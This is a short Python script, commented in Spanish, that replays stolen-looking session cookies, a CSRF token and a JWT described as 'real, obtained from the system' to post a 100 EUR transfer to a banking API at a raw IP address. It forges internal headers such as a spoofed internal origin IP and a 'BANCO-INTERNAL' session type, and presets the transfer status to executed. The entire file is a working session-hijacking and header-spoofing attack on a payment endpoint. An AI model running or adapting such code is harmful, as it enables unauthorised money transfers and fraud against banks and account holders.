import requests
import uuid

# Datos reales del login previo
session = requests.Session()

session.cookies.update({
    'csrftoken': 'c7JgjaDBxCeUusaQ5tIu16FUOUCcvb6S',
    'sessionid': 'e7vjs7gukq4qr8f9oexkkha04nrqm761'
})

# Token real que obtuvimos desde el sistema
real_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1hcmttdXI4OCIsImlhdCI6MTc1MTc3ODE4NywiZXhwIjoxNzUxNzgzMTg3fQ.hCrq6g9XU421R0Zb1535g015J3794578932a6e866b7d82"

# Datos reales de la transferencia
data = {
    "payment_id": str(uuid.uuid4()),
    "instructed_amount": 100.00,
    "currency": "EUR",
    "debtor_account": {
        "iban": "DE0050000100200044824",
    },
    "creditor_account": {
        "iban": "DE00500700100200044874",
    },
    "creditor": {
        "name": "Tom Winter",
        "address": {
            "street": "Augsburger Strasse 14a",
            "city": "München",
            "country": "DE"
        }
    },
    "debtor": {
        "name": "Anna Meyer",
        "address": {
            "street": "Frankfurter Allee 11",
            "city": "Berlin",
            "country": "DE"
        }
    },
    "purpose_code": "GDSV",
    "requested_execution_date": "2025-07-06",
    "remittance_information_unstructured": "Pago interno entre cuentas",
    "status": "ACSC"  # Ejecutado con éxito
}

# === HEADERS ===
session.headers.update({
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (Internal Browser)",
    "Accept": "application/json",
    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Authorization": f"Bearer {real_jwt}",     # ✅ Token real, no dummy
    "X-CSRFToken": "c7JgjaDBxCeUusaQ5tIu16FUOUCcvb6S",
    "X-Origin-IP": "192.168.1.10",           # ✅ IP interna simulada
    "X-Location": "OFICINA-CENTRAL-ES",        # ✅ Firma del backend
    "X-Token-ID": real_jwt,                   # ✅ Token real, no dummy
    "X-Session-Type": "BANCO-INTERNAL",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json"
})

# === Enviar transferencia desde token real y sesión interna ==
transfer_response = session.post(
    "http://80.78.30.242:9181/api/send-transfer", json=data)
print("[+] Respuesta de transferencia con token real:")
print("Status:", transfer_response.status_code)
print("Headers:", transfer_response.headers)
print("Respuesta:", transfer_response.text)